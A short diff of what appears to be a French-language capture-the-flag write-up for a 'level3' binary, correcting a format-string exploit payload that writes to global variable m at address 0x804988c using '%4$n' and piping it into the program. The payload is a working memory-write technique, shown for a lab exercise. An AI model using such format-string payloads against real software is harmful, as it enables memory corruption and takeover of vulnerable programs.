@@ -55,7 +55,7 @@ x/x 0x804988c
 0x804988c <m>: 0x00000000
 Il s'agit donc d'une varible m qui est nulle. Essayons donc d'ecrire 64 caractere dans la variqble m. 
 
-python -c 'print("\x8c\x98\x04\x08: + "A" * 64 + "%4$n")' > /tmp/level3
+python -c 'print("\x8c\x98\x04\x08" + "A" * 60 + "%4$n")' > /tmp/level3
 cat /tmp/level3 - | ./level3
 �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Wait what?!
